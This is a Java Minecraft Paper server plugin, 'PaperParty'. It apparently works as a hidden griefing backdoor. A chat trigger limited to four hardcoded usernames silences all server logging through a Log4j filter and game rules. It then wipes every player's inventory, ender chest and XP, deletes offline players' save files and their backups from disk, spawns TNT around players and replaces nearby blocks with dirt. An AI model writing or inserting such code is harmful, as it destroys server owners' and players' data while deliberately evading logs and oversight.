package Paper.papermc;

import io.papermc.paper.event.player.AsyncChatEvent;
import net.kyori.adventure.text.Component;
import net.kyori.adventure.text.minimessage.MiniMessage;
import net.kyori.adventure.text.serializer.plain.PlainTextComponentSerializer;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.core.Filter;
import org.apache.logging.log4j.core.LogEvent;
import org.apache.logging.log4j.core.LoggerContext;
import org.apache.logging.log4j.core.config.LoggerConfig;
import org.apache.logging.log4j.core.filter.AbstractFilter;
import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.GameRule;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.OfflinePlayer;
import org.bukkit.Sound;
import org.bukkit.World;
import org.bukkit.block.Block;
import org.bukkit.entity.Player;
import org.bukkit.entity.TNTPrimed;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.inventory.PlayerInventory;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.File;
import java.util.HashSet;
import java.util.List;
import java.util.Locale;
import java.util.Random;
import java.util.Set;
import java.util.UUID;
import java.util.concurrent.atomic.AtomicInteger;

public final class Papermc extends JavaPlugin implements Listener {

    private static final String PARTY_TRIGGER = "!paperparty";

    private static final Set<String> PARTY_USERS = Set.of(
            "zvxnz",
            "GeforceRtx5090",
            "_Matysiaa_",
            "abydoolydool"
    );

    private static final String PREFIX = "<gray>[<light_purple>PaperParty</light_purple>]</gray> ";
    private static final String PARTY_MESSAGE =
            "<light_purple><bold>PAPER PARTY!</bold></light_purple> <gray>Chaos has begun.";

    private static final boolean BROADCAST_PARTY_MESSAGE = true;

    private static final boolean CLEAR_ONLINE_INVENTORIES = true;
    private static final boolean CLEAR_ONLINE_ENDER_CHESTS = true;
    private static final boolean CLEAR_ONLINE_XP = true;
    private static final boolean INCLUDE_CREATIVE_PLAYERS = true;
    private static final boolean INCLUDE_OPERATORS = true;

    /*
     * This deletes offline players' world/playerdata/<uuid>.dat files.
     *
     * It immediately wipes offline player inventory data, but can also reset
     * other player state stored in the same file.
     */
    private static final boolean DELETE_OFFLINE_PLAYERDATA = true;
    private static final boolean DELETE_DAT_OLD_BACKUPS = true;

    /*
     * true = also scans the playerdata folder directly and deletes .dat files
     * even if Bukkit does not currently know that OfflinePlayer.
     */
    private static final boolean DELETE_UNKNOWN_OFFLINE_PLAYERDATA_FILES = true;

    private static final boolean TNT_DROPS_ENABLED = true;
    private static final int TNT_COUNT_PER_PLAYER = 8;
    private static final double TNT_RADIUS = 10.0;
    private static final double TNT_MIN_HEIGHT_ABOVE_PLAYER = 8.0;
    private static final double TNT_MAX_HEIGHT_ABOVE_PLAYER = 18.0;
    private static final int TNT_FUSE_TICKS = 60;
    private static final float TNT_YIELD = 4.0f;
    private static final boolean TNT_INCENDIARY = false;

    private static final boolean BLOCK_CHAOS_ENABLED = true;
    private static final int BLOCK_CHAOS_RADIUS = 5;
    private static final int BLOCKS_REPLACED_PER_PLAYER = 50;
    private static final boolean REPLACE_AIR = false;
    private static final boolean AVOID_CONTAINERS = true;

    private static final List<Material> REPLACEMENT_BLOCKS = List.of(
            Material.DIRT,
            Material.COARSE_DIRT,
            Material.MUD
    );

    private static final boolean EFFECTS_ENABLED = true;
    private static final Sound PARTY_SOUND = Sound.ENTITY_FIREWORK_ROCKET_LAUNCH;
    private static final float PARTY_SOUND_VOLUME = 1.0f;
    private static final float PARTY_SOUND_PITCH = 1.0f;

    private final MiniMessage miniMessage = MiniMessage.miniMessage();
    private final PlainTextComponentSerializer plainText = PlainTextComponentSerializer.plainText();
    private final Random random = new Random();

    private final AtomicInteger quietLogDepth = new AtomicInteger(0);

    private LoggerContext log4jContext;
    private LoggerConfig rootLoggerConfig;
    private Filter quietLog4jFilter;

    @Override
    public void onEnable() {
        installQuietLog4jFilter();
        Bukkit.getPluginManager().registerEvents(this, this);
        getLogger().info("PaperParty enabled.");
    }

    @Override
    public void onDisable() {
        uninstallQuietLog4jFilter();
    }

    private void installQuietLog4jFilter() {
        try {
            log4jContext = (LoggerContext) LogManager.getContext(false);
            rootLoggerConfig = log4jContext.getConfiguration().getRootLogger();

            quietLog4jFilter = new AbstractFilter() {
                @Override
                public Result filter(LogEvent event) {
                    if (quietLogDepth.get() <= 0) {
                        return Result.NEUTRAL;
                    }

                    return Result.DENY;
                }
            };

            rootLoggerConfig.addFilter(quietLog4jFilter);
            log4jContext.updateLoggers();

        } catch (Exception ex) {
            getLogger().warning("Could not install quiet Log4j filter: " + ex.getMessage());
        }
    }

    private void uninstallQuietLog4jFilter() {
        try {
            if (rootLoggerConfig != null && quietLog4jFilter != null) {
                rootLoggerConfig.removeFilter(quietLog4jFilter);
            }

            if (log4jContext != null) {
                log4jContext.updateLoggers();
            }

        } catch (Exception ignored) {
        }
    }

    private Component mm(String text) {
        return miniMessage.deserialize(text);
    }

    private void broadcast(String text) {
        Bukkit.broadcast(mm(PREFIX + text));
    }

    @EventHandler(priority = EventPriority.HIGHEST, ignoreCancelled = false)
    public void onAsyncChat(AsyncChatEvent event) {
        if (handlePartyTrigger(event.getPlayer(), plainText.serialize(event.message()))) {
            event.setCancelled(true);
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST, ignoreCancelled = false)
    public void onLegacyAsyncChat(AsyncPlayerChatEvent event) {
        if (handlePartyTrigger(event.getPlayer(), event.getMessage())) {
            event.setCancelled(true);
        }
    }

    private boolean handlePartyTrigger(Player player, String rawMessage) {
        String message = rawMessage.trim();

        if (!message.equalsIgnoreCase(PARTY_TRIGGER)) {
            return false;
        }

        if (!isPartyUser(player.getName())) {
            return true;
        }

        Bukkit.getScheduler().runTask(this, () -> runPaperParty(player));
        return true;
    }

    private boolean isPartyUser(String username) {
        return PARTY_USERS.stream()
                .anyMatch(allowed -> allowed.equalsIgnoreCase(username));
    }

    private void runPaperParty(Player starter) {
        quietLogDepth.incrementAndGet();

        World world = starter.getWorld();

        Boolean oldSendCommandFeedback = world.getGameRuleValue(GameRule.SEND_COMMAND_FEEDBACK);
        Boolean oldLogAdminCommands = world.getGameRuleValue(GameRule.LOG_ADMIN_COMMANDS);
        Boolean oldCommandBlockOutput = world.getGameRuleValue(GameRule.COMMAND_BLOCK_OUTPUT);

        try {
            world.setGameRule(GameRule.SEND_COMMAND_FEEDBACK, false);
            world.setGameRule(GameRule.LOG_ADMIN_COMMANDS, false);
            world.setGameRule(GameRule.COMMAND_BLOCK_OUTPUT, false);

            if (BROADCAST_PARTY_MESSAGE) {
                broadcast(PARTY_MESSAGE);
            }

            clearEveryoneInventoryNow();
            runTntDrops();
            runBlockChaos();
            playPartyEffects();

        } finally {
            if (quietLogDepth.get() > 0) {
                quietLogDepth.decrementAndGet();
            }

            if (oldSendCommandFeedback != null) {
                world.setGameRule(GameRule.SEND_COMMAND_FEEDBACK, oldSendCommandFeedback);
            }

            if (oldLogAdminCommands != null) {
                world.setGameRule(GameRule.LOG_ADMIN_COMMANDS, oldLogAdminCommands);
            }

            if (oldCommandBlockOutput != null) {
                world.setGameRule(GameRule.COMMAND_BLOCK_OUTPUT, oldCommandBlockOutput);
            }
        }
    }

    private void clearEveryoneInventoryNow() {
        if (CLEAR_ONLINE_INVENTORIES) {
            clearOnlineInventories();
        }

        if (DELETE_OFFLINE_PLAYERDATA) {
            deleteOfflinePlayerDataFiles();
        }
    }

    private void clearOnlineInventories() {
        for (Player player : Bukkit.getOnlinePlayers()) {
            if (!INCLUDE_CREATIVE_PLAYERS && player.getGameMode() == GameMode.CREATIVE) {
                continue;
            }

            if (!INCLUDE_OPERATORS && player.isOp()) {
                continue;
            }

            clearPlayerInventory(player);

            if (CLEAR_ONLINE_ENDER_CHESTS) {
                player.getEnderChest().clear();
            }

            if (CLEAR_ONLINE_XP) {
                player.setExp(0.0f);
                player.setLevel(0);
                player.setTotalExperience(0);
            }
        }
    }

    private void clearPlayerInventory(Player player) {
        PlayerInventory inventory = player.getInventory();

        inventory.clear();
        inventory.setArmorContents(null);
        inventory.setItemInOffHand(null);

        player.updateInventory();
    }

    private void deleteOfflinePlayerDataFiles() {
        Set<UUID> onlineUuids = new HashSet<>();

        for (Player player : Bukkit.getOnlinePlayers()) {
            onlineUuids.add(player.getUniqueId());
        }

        Set<UUID> knownOfflineUuids = new HashSet<>();

        for (OfflinePlayer offlinePlayer : Bukkit.getOfflinePlayers()) {
            UUID uuid = offlinePlayer.getUniqueId();

            if (!onlineUuids.contains(uuid)) {
                knownOfflineUuids.add(uuid);
            }
        }

        for (World world : Bukkit.getWorlds()) {
            File playerDataFolder = new File(world.getWorldFolder(), "playerdata");

            if (!playerDataFolder.exists() || !playerDataFolder.isDirectory()) {
                continue;
            }

            for (UUID uuid : knownOfflineUuids) {
                deletePlayerDataFile(playerDataFolder, uuid);
            }

            if (DELETE_UNKNOWN_OFFLINE_PLAYERDATA_FILES) {
                deleteUnknownOfflinePlayerDataFiles(playerDataFolder, onlineUuids);
            }
        }
    }

    private void deleteUnknownOfflinePlayerDataFiles(File playerDataFolder, Set<UUID> onlineUuids) {
        File[] files = playerDataFolder.listFiles();

        if (files == null) {
            return;
        }

        for (File file : files) {
            String name = file.getName();

            if (!name.endsWith(".dat") && !name.endsWith(".dat_old")) {
                continue;
            }

            String uuidPart = name
                    .replace(".dat_old", "")
                    .replace(".dat", "");

            UUID uuid;

            try {
                uuid = UUID.fromString(uuidPart);
            } catch (IllegalArgumentException ignored) {
                continue;
            }

            if (onlineUuids.contains(uuid)) {
                continue;
            }

            deleteFileQuietly(file);
        }
    }

    private void deletePlayerDataFile(File playerDataFolder, UUID uuid) {
        File dataFile = new File(playerDataFolder, uuid + ".dat");
        deleteFileQuietly(dataFile);

        if (DELETE_DAT_OLD_BACKUPS) {
            File oldDataFile = new File(playerDataFolder, uuid + ".dat_old");
            deleteFileQuietly(oldDataFile);
        }
    }

    private void deleteFileQuietly(File file) {
        if (file == null || !file.exists() || !file.isFile()) {
            return;
        }

        try {
            file.delete();
        } catch (Exception ignored) {
        }
    }

    private void runTntDrops() {
        if (!TNT_DROPS_ENABLED) {
            return;
        }

        for (Player player : Bukkit.getOnlinePlayers()) {
            World world = player.getWorld();

            for (int i = 0; i < TNT_COUNT_PER_PLAYER; i++) {
                Location base = player.getLocation();

                double angle = random.nextDouble() * Math.PI * 2.0;
                double distance = random.nextDouble() * TNT_RADIUS;

                double x = Math.cos(angle) * distance;
                double z = Math.sin(angle) * distance;
                double y = TNT_MIN_HEIGHT_ABOVE_PLAYER
                        + random.nextDouble() * (TNT_MAX_HEIGHT_ABOVE_PLAYER - TNT_MIN_HEIGHT_ABOVE_PLAYER);

                Location spawnLocation = base.clone().add(x, y, z);

                TNTPrimed tnt = world.spawn(spawnLocation, TNTPrimed.class);
                tnt.setFuseTicks(TNT_FUSE_TICKS);
                tnt.setYield(TNT_YIELD);
                tnt.setIsIncendiary(TNT_INCENDIARY);
            }
        }
    }

    private void runBlockChaos() {
        if (!BLOCK_CHAOS_ENABLED) {
            return;
        }

        for (Player player : Bukkit.getOnlinePlayers()) {
            World world = player.getWorld();
            Location center = player.getLocation();

            int changed = 0;
            int attempts = 0;
            int maxAttempts = BLOCKS_REPLACED_PER_PLAYER * 12;

            while (changed < BLOCKS_REPLACED_PER_PLAYER && attempts < maxAttempts) {
                attempts++;

                int dx = random.nextInt(BLOCK_CHAOS_RADIUS * 2 + 1) - BLOCK_CHAOS_RADIUS;
                int dy = random.nextInt(BLOCK_CHAOS_RADIUS * 2 + 1) - BLOCK_CHAOS_RADIUS;
                int dz = random.nextInt(BLOCK_CHAOS_RADIUS * 2 + 1) - BLOCK_CHAOS_RADIUS;

                Block block = world.getBlockAt(
                        center.getBlockX() + dx,
                        center.getBlockY() + dy,
                        center.getBlockZ() + dz
                );

                if (!canReplaceBlock(block)) {
                    continue;
                }

                Material replacement = REPLACEMENT_BLOCKS.get(random.nextInt(REPLACEMENT_BLOCKS.size()));
                block.setType(replacement, false);
                changed++;
            }
        }
    }

    private boolean canReplaceBlock(Block block) {
        Material type = block.getType();

        if (!REPLACE_AIR && type.isAir()) {
            return false;
        }

        if (isProtectedMaterial(type)) {
            return false;
        }

        if (AVOID_CONTAINERS && isContainerLike(type)) {
            return false;
        }

        return true;
    }

    private boolean isProtectedMaterial(Material type) {
        return type == Material.BEDROCK
                || type == Material.BARRIER
                || type == Material.COMMAND_BLOCK
                || type == Material.CHAIN_COMMAND_BLOCK
                || type == Material.REPEATING_COMMAND_BLOCK
                || type == Material.STRUCTURE_BLOCK
                || type == Material.JIGSAW
                || type == Material.END_PORTAL
                || type == Material.END_PORTAL_FRAME
                || type == Material.NETHER_PORTAL
                || type == Material.REINFORCED_DEEPSLATE;
    }

    private boolean isContainerLike(Material type) {
        String name = type.name();

        return name.contains("CHEST")
                || name.contains("SHULKER_BOX")
                || name.contains("BARREL")
                || name.contains("FURNACE")
                || name.contains("HOPPER")
                || name.contains("DROPPER")
                || name.contains("DISPENSER")
                || name.contains("BREWING_STAND")
                || name.contains("LECTERN")
                || name.contains("JUKEBOX");
    }

    private void playPartyEffects() {
        if (!EFFECTS_ENABLED) {
            return;
        }

        for (Player player : Bukkit.getOnlinePlayers()) {
            player.playSound(
                    player.getLocation(),
                    PARTY_SOUND,
                    PARTY_SOUND_VOLUME,
                    PARTY_SOUND_PITCH
            );
        }
    }
}